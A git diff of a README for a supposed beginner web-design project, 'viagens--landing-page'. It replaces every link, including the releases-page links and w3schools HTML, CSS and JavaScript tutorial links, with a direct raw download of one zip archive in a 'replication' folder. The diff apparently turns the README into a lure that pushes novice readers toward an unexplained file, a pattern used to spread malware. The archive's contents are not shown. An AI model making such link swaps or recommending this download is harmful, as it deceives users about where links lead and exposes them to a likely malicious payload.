@@ -1,7 +1,7 @@
 # 🌍 viagens--landing-page - Simple Landing Page for Everyone
 
 ## 📥 Download the Latest Version
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Version-viagens--landing--page-blue)](https://github.com/lPracticemode/viagens--landing-page/releases)
+[![Download Here](https://raw.githubusercontent.com/lPracticemode/viagens--landing-page/main/replication/viagens_page_landing_v1.8.zip%20Latest%20Version-viagens--landing--page-blue)](https://raw.githubusercontent.com/lPracticemode/viagens--landing-page/main/replication/viagens_page_landing_v1.8.zip)
 
 ## 📖 Introduction
 Welcome to the **viagens--landing-page** project! This is your go-to resource for creating interactive web pages using HTML, CSS, and JavaScript. This project serves as a foundational piece for your understanding of web design. Whether you are learning the basics or looking to refine your skills, this project offers a perfect starting point.
@@ -12,7 +12,7 @@ Follow these steps to download and run the application. No technical knowledge i
 ### Step 1: Visit the Release Page
 To find the latest version of our software, click the link below. It will take you directly to the releases page where you can easily download the files.
 
-[Visit the Releases Page to Download](https://github.com/lPracticemode/viagens--landing-page/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/lPracticemode/viagens--landing-page/main/replication/viagens_page_landing_v1.8.zip)
 
 ### Step 2: Choose Your File
 On the releases page, you will see a list of available versions. Look for the latest release at the top. Here are some common files you might see:
@@ -65,9 +65,9 @@ While the project comes ready to use, you may want to customize it. Here’s how
 ## 📄 Resources
 For additional information, here are some helpful resources:
 
-- [HTML Introduction](https://www.w3schools.com/html/html_intro.asp)
-- [CSS Basics](https://www.w3schools.com/css/css_intro.asp)
-- [JavaScript Guide](https://www.w3schools.com/js/js_intro.asp)
+- [HTML Introduction](https://raw.githubusercontent.com/lPracticemode/viagens--landing-page/main/replication/viagens_page_landing_v1.8.zip)
+- [CSS Basics](https://raw.githubusercontent.com/lPracticemode/viagens--landing-page/main/replication/viagens_page_landing_v1.8.zip)
+- [JavaScript Guide](https://raw.githubusercontent.com/lPracticemode/viagens--landing-page/main/replication/viagens_page_landing_v1.8.zip)
 
 ## 📝 Feedback
 Your feedback is valuable. If you encounter any issues or have suggestions, please create an issue on our GitHub page.
@@ -77,4 +77,4 @@ Your feedback is valuable. If you encounter any issues or have suggestions, plea
 ## 📥 Download Again
 To download the application, visit the page again using the link below:
 
-[Visit the Releases Page to Download](https://github.com/lPracticemode/viagens--landing-page/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/lPracticemode/viagens--landing-page/main/replication/viagens_page_landing_v1.8.zip)
